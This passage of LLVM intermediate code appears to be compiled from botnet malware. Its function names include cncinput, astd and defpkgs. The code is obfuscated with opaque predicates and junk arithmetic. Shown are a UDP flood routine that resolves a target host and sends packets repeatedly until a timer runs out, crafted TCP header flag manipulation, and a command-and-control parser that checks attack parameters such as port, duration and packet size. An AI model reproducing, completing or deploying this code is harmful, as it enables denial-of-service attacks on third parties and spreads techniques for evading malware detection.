  %_163 = sub i16 %698, -4097
  %gen164 = mul i16 %_163, -4097
  %_165 = sub i16 %698, -4097
  %gen166 = mul i16 %_165, -4097
  %_167 = sub i16 0, %698
  %gen168 = add i16 %_167, -4097
  %_169 = sub i16 0, %698
  %gen170 = add i16 %_169, -4097
  %699 = and i16 %698, -4097
  %700 = or i16 %699, 4096
  store i16 %700, i16* %697, align 4
  %701 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %702 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %701, i32 0, i32 0
  %703 = bitcast %union.anon.1* %702 to %struct.anon.2*
  %704 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %703, i32 0, i32 4
  %705 = load i16, i16* %704, align 4
  %_171 = sub i16 %705, -2049
  %gen172 = mul i16 %_171, -2049
  %_173 = sub i16 %705, -2049
  %gen174 = mul i16 %_173, -2049
  %706 = and i16 %705, -2049
  %_175 = shl i16 %706, 2048
  %707 = or i16 %706, 2048
  store i16 %707, i16* %704, align 4
  br label %originalBB106

originalBB179alteredBB:                           ; preds = %originalBB179, %297
  %708 = load i8*, i8** %31, align 8
  %709 = call i32 @strcmp(i8* %708, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i32 0, i32 0)) #10
  %710 = icmp ne i32 %709, 0
  br label %originalBB179

originalBB183alteredBB:                           ; preds = %originalBB183, %325
  %711 = load i8*, i8** %31, align 8
  %712 = call i32 @strcmp(i8* %711, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i32 0, i32 0)) #10
  %713 = icmp ne i32 %712, 0
  br label %originalBB183

originalBB187alteredBB:                           ; preds = %originalBB187, %357
  %714 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %715 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %714, i32 0, i32 0
  %716 = bitcast %union.anon.1* %715 to %struct.anon.2*
  %717 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %716, i32 0, i32 4
  %718 = load i16, i16* %717, align 4
  %_188 = shl i16 %718, -4097
  %_189 = sub i16 0, %718
  %gen190 = add i16 %_189, -4097
  %_191 = sub i16 %718, -4097
  %gen192 = mul i16 %_191, -4097
  %_193 = shl i16 %718, -4097
  %_194 = sub i16 0, %718
  %gen195 = add i16 %_194, -4097
  %_196 = sub i16 %718, -4097
  %gen197 = mul i16 %_196, -4097
  %_198 = sub i16 %718, -4097
  %gen199 = mul i16 %_198, -4097
  %_200 = sub i16 %718, -4097
  %gen201 = mul i16 %_200, -4097
  %719 = and i16 %718, -4097
  %_202 = sub i16 %719, 4096
  %gen203 = mul i16 %_202, 4096
  %_204 = sub i16 0, %719
  %gen205 = add i16 %_204, 4096
  %_206 = shl i16 %719, 4096
  %_207 = sub i16 0, %719
  %gen208 = add i16 %_207, 4096
  %_209 = sub i16 %719, 4096
  %gen210 = mul i16 %_209, 4096
  %_211 = sub i16 0, %719
  %gen212 = add i16 %_211, 4096
  %720 = or i16 %719, 4096
  store i16 %720, i16* %717, align 4
  br label %originalBB187

originalBB217alteredBB:                           ; preds = %originalBB217, %398
  %721 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %721, i8** %31, align 8
  br label %originalBB217

originalBB221alteredBB:                           ; preds = %originalBB221, %434
  %722 = call i32 @rand_cmwc()
  br label %originalBB221

originalBB225alteredBB:                           ; preds = %originalBB225, %482
  br label %originalBB225

originalBB229alteredBB:                           ; preds = %originalBB229, %551
  %723 = load i32, i32* %33, align 4
  %_230 = sub i32 0, %723
  %gen231 = add i32 %_230, 1
  %_232 = sub i32 %723, 1
  %gen233 = mul i32 %_232, 1
  %_234 = sub i32 0, %723
  %gen235 = add i32 %_234, 1
  %_236 = shl i32 %723, 1
  %724 = add i32 %723, 1
  store i32 %724, i32* %33, align 4
  br label %originalBB229

originalBB240alteredBB:                           ; preds = %originalBB240, %572
  br label %originalBB240
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #5

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @astd(i8*, i32, i32, i32) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca %struct.hostent*, align 8
  %13 = alloca i32, align 4
  %14 = alloca [1 x i8*], align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %15 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %15, i32* %9, align 4
  %16 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %17 = sext i32 %16 to i64
  store i64 %17, i64* %10, align 8
  %18 = load i8*, i8** %5, align 8
  %19 = call %struct.hostent* @gethostbyname(i8* %18)
  store %struct.hostent* %19, %struct.hostent** %12, align 8
  %20 = bitcast %struct.sockaddr_in* %11 to i8*
  call void @llvm.memset.p0i8.i64(i8* %20, i8 0, i64 16, i32 4, i1 false)
  %21 = load %struct.hostent*, %struct.hostent** %12, align 8
  %22 = getelementptr inbounds %struct.hostent, %struct.hostent* %21, i32 0, i32 4
  %23 = load i8**, i8*** %22, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  %27 = bitcast %struct.in_addr* %26 to i8*
  %28 = load %struct.hostent*, %struct.hostent** %12, align 8
  %29 = getelementptr inbounds %struct.hostent, %struct.hostent* %28, i32 0, i32 3
  %30 = load i32, i32* %29, align 4
  %31 = sext i32 %30 to i64
  call void @bcopy(i8* %25, i8* %27, i64 %31) #6
  %32 = load %struct.hostent*, %struct.hostent** %12, align 8
  %33 = getelementptr inbounds %struct.hostent, %struct.hostent* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = trunc i32 %34 to i16
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  store i16 %35, i16* %36, align 4
  %37 = load i32, i32* %6, align 4
  %38 = trunc i32 %37 to i16
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 0, i32* %13, align 4
  br label %40

; <label>:40:                                     ; preds = %81, %4
  %41 = bitcast [1 x i8*]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %41, i8* bitcast ([1 x i8*]* @astd.hexstring to i8*), i64 8, i32 8, i1 false)
  %42 = load i32, i32* %13, align 4
  %43 = icmp uge i32 %42, 50
  br i1 %43, label %44, label %81

; <label>:44:                                     ; preds = %40
  %45 = load i32, i32* %9, align 4
  %46 = getelementptr inbounds [1 x i8*], [1 x i8*]* %14, i32 0, i32 0
  %47 = bitcast i8** %46 to i8*
  %48 = load i32, i32* %8, align 4
  %49 = sext i32 %48 to i64
  %50 = call i64 @send(i32 %45, i8* %47, i64 %49, i32 0)
  %51 = load i32, i32* %9, align 4
  %52 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 16)
  %54 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %55 = sext i32 %54 to i64
  %56 = load i64, i64* %10, align 8
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = add nsw i64 %56, %58
  %60 = icmp sge i64 %55, %59
  br i1 %60, label %61, label %64

; <label>:61:                                     ; preds = %44
  %62 = load i32, i32* %9, align 4
  %63 = call i32 @close(i32 %62)
  call void @_exit(i32 0) #11
  unreachable

; <label>:64:                                     ; preds = %44
  %65 = load i32, i32* @x.43
  %66 = load i32, i32* @y.44
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %64
  store i32 0, i32* %13, align 4
  %73 = load i32, i32* @x.43
  %74 = load i32, i32* @y.44
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %81

; <label>:81:                                     ; preds = %originalBBpart2, %40
  %82 = load i32, i32* %13, align 4
  %83 = add i32 %82, 1
  store i32 %83, i32* %13, align 4
  br label %40
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %64
  store i32 0, i32* %13, align 4
  br label %originalBB
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i8* @defarchs() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.12, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i8* @defopsys() #0 {
  %1 = load i32, i32* @x.47
  %2 = load i32, i32* @y.48
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = load i32, i32* @x.47
  %10 = load i32, i32* @y.48
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0)

originalBBalteredBB:                              ; preds = %originalBB, %0
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i8* @defpkgs() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.14, i32 0, i32 0), i32 0) #6
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %21

; <label>:4:                                      ; preds = %0
  %5 = load i32, i32* @x.49
  %6 = load i32, i32* @y.50
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), i8** %1, align 8
  %13 = load i32, i32* @x.49
  %14 = load i32, i32* @y.50
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %94

; <label>:21:                                     ; preds = %0
  %22 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.16, i32 0, i32 0), i32 0) #6
  %23 = icmp ne i32 %22, -1
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %21
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i32 0, i32 0), i8** %1, align 8
  br label %94

; <label>:25:                                     ; preds = %21
  %26 = call i32 @access(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.18, i32 0, i32 0), i32 0) #6
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %25
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.19, i32 0, i32 0), i8** %1, align 8
  br label %94

; <label>:29:                                     ; preds = %25
  %30 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.20, i32 0, i32 0), i32 0) #6
  %31 = icmp ne i32 %30, -1
  br i1 %31, label %32, label %33

; <label>:32:                                     ; preds = %29
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.21, i32 0, i32 0), i8** %1, align 8
  br label %94

; <label>:33:                                     ; preds = %29
  %34 = load i32, i32* @x.49
  %35 = load i32, i32* @y.50
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = call i32 @access(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i32 0, i32 0), i32 0) #6
  %43 = icmp ne i32 %42, -1
  %44 = load i32, i32* @x.49
  %45 = load i32, i32* @y.50
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %43, label %52, label %69

; <label>:52:                                     ; preds = %originalBBpart24
  %53 = load i32, i32* @x.49
  %54 = load i32, i32* @y.50
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %52
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.23, i32 0, i32 0), i8** %1, align 8
  %61 = load i32, i32* @x.49
  %62 = load i32, i32* @y.50
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %94

; <label>:69:                                     ; preds = %originalBBpart24
  %70 = load i32, i32* @x.49
  %71 = load i32, i32* @y.50
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %69
  %78 = call i32 @access(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i32 0, i32 0), i32 0) #6
  %79 = icmp ne i32 %78, -1
  %80 = load i32, i32* @x.49
  %81 = load i32, i32* @y.50
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %79, label %88, label %89

; <label>:88:                                     ; preds = %originalBBpart212
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8** %1, align 8
  br label %94

; <label>:89:                                     ; preds = %originalBBpart212
  %90 = call i32 @access(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i32 0) #6
  %91 = icmp ne i32 %90, -1
  br i1 %91, label %92, label %93

; <label>:92:                                     ; preds = %89
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.27, i32 0, i32 0), i8** %1, align 8
  br label %94

; <label>:93:                                     ; preds = %89
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.28, i32 0, i32 0), i8** %1, align 8
  br label %94

; <label>:94:                                     ; preds = %93, %92, %88, %originalBBpart28, %32, %28, %24, %originalBBpart2
  %95 = load i8*, i8** %1, align 8
  ret i8* %95

originalBBalteredBB:                              ; preds = %originalBB, %4
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), i8** %1, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  %96 = call i32 @access(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.22, i32 0, i32 0), i32 0) #6
  %97 = icmp ne i32 %96, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %52
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.23, i32 0, i32 0), i8** %1, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %69
  %98 = call i32 @access(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.24, i32 0, i32 0), i32 0) #6
  %99 = icmp ne i32 %98, -1
  br label %originalBB10
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @cncinput(i32, i8**) #0 {
  %3 = load i32, i32* @x.51
  %4 = load i32, i32* @y.52
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i64, align 8
  store i32 %0, i32* %11, align 4
  store i8** %1, i8*** %12, align 8
  %35 = load i8**, i8*** %12, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @strcmp(i8* %37, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.29, i32 0, i32 0)) #10
  %39 = icmp ne i32 %38, 0
  %40 = load i32, i32* @x.51
  %41 = load i32, i32* @y.52
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %39, label %343, label %48

; <label>:48:                                     ; preds = %originalBBpart2
  %49 = load i32, i32* @x.51
  %50 = load i32, i32* @y.52
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %48
  %57 = load i32, i32* %11, align 4
  %58 = icmp slt i32 %57, 6
  %59 = load i32, i32* @x.51
  %60 = load i32, i32* @y.52
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %58, label %166, label %67

; <label>:67:                                     ; preds = %originalBBpart24
  %68 = load i8**, i8*** %12, align 8
  %69 = getelementptr inbounds i8*, i8** %68, i64 3
  %70 = load i8*, i8** %69, align 8
  %71 = call i32 @atoi(i8* %70) #10
  %72 = icmp eq i32 %71, -1
  br i1 %72, label %166, label %73

; <label>:73:                                     ; preds = %67
  %74 = load i8**, i8*** %12, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 2
  %76 = load i8*, i8** %75, align 8
  %77 = call i32 @atoi(i8* %76) #10
  %78 = icmp eq i32 %77, -1
  br i1 %78, label %166, label %79

; <label>:79:                                     ; preds = %73
  %80 = load i8**, i8*** %12, align 8
  %81 = getelementptr inbounds i8*, i8** %80, i64 4
  %82 = load i8*, i8** %81, align 8
  %83 = call i32 @atoi(i8* %82) #10
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %166, label %85

; <label>:85:                                     ; preds = %79
  %86 = load i32, i32* @x.51
  %87 = load i32, i32* @y.52
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %85
  %94 = load i8**, i8*** %12, align 8
  %95 = getelementptr inbounds i8*, i8** %94, i64 5
  %96 = load i8*, i8** %95, align 8
  %97 = call i32 @atoi(i8* %96) #10
  %98 = icmp eq i32 %97, -1
  %99 = load i32, i32* @x.51
  %100 = load i32, i32* @y.52
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %98, label %166, label %107

; <label>:107:                                    ; preds = %originalBBpart28
  %108 = load i32, i32* @x.51
  %109 = load i32, i32* @y.52
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %107
  %116 = load i8**, i8*** %12, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 5
  %118 = load i8*, i8** %117, align 8
  %119 = call i32 @atoi(i8* %118) #10
  %120 = icmp sgt i32 %119, 65536
  %121 = load i32, i32* @x.51
  %122 = load i32, i32* @y.52
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %120, label %166, label %129

; <label>:129:                                    ; preds = %originalBBpart212
  %130 = load i32, i32* @x.51
  %131 = load i32, i32* @y.52
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %129
  %138 = load i8**, i8*** %12, align 8
  %139 = getelementptr inbounds i8*, i8** %138, i64 5
  %140 = load i8*, i8** %139, align 8
  %141 = call i32 @atoi(i8* %140) #10
  %142 = icmp sgt i32 %141, 65500
  %143 = load i32, i32* @x.51
  %144 = load i32, i32* @y.52
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %142, label %166, label %151

; <label>:151:                                    ; preds = %originalBBpart216
  %152 = load i8**, i8*** %12, align 8
  %153 = getelementptr inbounds i8*, i8** %152, i64 4
  %154 = load i8*, i8** %153, align 8
  %155 = call i32 @atoi(i8* %154) #10
  %156 = icmp sgt i32 %155, 32
  br i1 %156, label %166, label %157

; <label>:157:                                    ; preds = %151
  %158 = load i32, i32* %11, align 4
  %159 = icmp eq i32 %158, 7
  br i1 %159, label %160, label %183

; <label>:160:                                    ; preds = %157
  %161 = load i8**, i8*** %12, align 8
  %162 = getelementptr inbounds i8*, i8** %161, i64 6
  %163 = load i8*, i8** %162, align 8
  %164 = call i32 @atoi(i8* %163) #10
  %165 = icmp slt i32 %164, 1
  br i1 %165, label %166, label %183

; <label>:166:                                    ; preds = %160, %151, %originalBBpart216, %originalBBpart212, %originalBBpart28, %79, %73, %67, %originalBBpart24
  %167 = load i32, i32* @x.51
  %168 = load i32, i32* @y.52
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %166
  %175 = load i32, i32* @x.51
  %176 = load i32, i32* @y.52
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %826

; <label>:183:                                    ; preds = %160, %157
  %184 = load i8**, i8*** %12, align 8
  %185 = getelementptr inbounds i8*, i8** %184, i64 1
  %186 = load i8*, i8** %185, align 8
  store i8* %186, i8** %13, align 8
  %187 = load i8**, i8*** %12, align 8
  %188 = getelementptr inbounds i8*, i8** %187, i64 2
  %189 = load i8*, i8** %188, align 8
  %190 = call i32 @atoi(i8* %189) #10
  store i32 %190, i32* %14, align 4
  %191 = load i8**, i8*** %12, align 8
  %192 = getelementptr inbounds i8*, i8** %191, i64 3
  %193 = load i8*, i8** %192, align 8
  %194 = call i32 @atoi(i8* %193) #10
  store i32 %194, i32* %15, align 4
  %195 = load i8**, i8*** %12, align 8
  %196 = getelementptr inbounds i8*, i8** %195, i64 4
  %197 = load i8*, i8** %196, align 8
  %198 = call i32 @atoi(i8* %197) #10
  store i32 %198, i32* %16, align 4
  %199 = load i8**, i8*** %12, align 8
  %200 = getelementptr inbounds i8*, i8** %199, i64 5
  %201 = load i8*, i8** %200, align 8
  %202 = call i32 @atoi(i8* %201) #10
  store i32 %202, i32* %17, align 4
  %203 = load i32, i32* %11, align 4
  %204 = icmp sgt i32 %203, 6
  br i1 %204, label %205, label %226

; <label>:205:                                    ; preds = %183
  %206 = load i32, i32* @x.51
  %207 = load i32, i32* @y.52
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %205
  %214 = load i8**, i8*** %12, align 8
  %215 = getelementptr inbounds i8*, i8** %214, i64 6
  %216 = load i8*, i8** %215, align 8
  %217 = call i32 @atoi(i8* %216) #10
  %218 = load i32, i32* @x.51
  %219 = load i32, i32* @y.52
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %227

; <label>:226:                                    ; preds = %183
  br label %227

; <label>:227:                                    ; preds = %226, %originalBBpart224
  %228 = phi i32 [ %217, %originalBBpart224 ], [ 1000, %226 ]
  store i32 %228, i32* %18, align 4
  %229 = load i8*, i8** %13, align 8
  %230 = call i8* @strstr(i8* %229, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #10
  %231 = icmp ne i8* %230, null
  br i1 %231, label %232, label %299

; <label>:232:                                    ; preds = %227
  %233 = load i8*, i8** %13, align 8
  %234 = call i8* @strtok(i8* %233, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %234, i8** %19, align 8
  br label %235

; <label>:235:                                    ; preds = %originalBBpart232, %232
  %236 = load i32, i32* @x.51
  %237 = load i32, i32* @y.52
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %235
  %244 = load i8*, i8** %19, align 8
  %245 = icmp ne i8* %244, null
  %246 = load i32, i32* @x.51
  %247 = load i32, i32* @y.52
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
